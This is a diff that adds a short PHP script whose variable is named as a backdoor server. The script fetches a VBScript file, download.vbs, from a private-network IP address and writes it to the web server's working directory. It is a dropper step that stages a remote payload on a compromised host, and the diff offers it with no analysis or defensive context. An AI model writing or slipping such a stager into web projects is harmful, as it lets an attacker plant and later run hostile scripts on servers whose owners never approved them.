@@ -1,0 +1,9 @@
+<?php 
+
+$backdoorSvr = "http://192.168.218.131/download.vbs";
+$fileName = fopen("./download.vbs", 'w'); 
+
+fwrite($fileName, file_get_contents($backdoorSvr)); 
+fclose($fileName); 
+
+?>
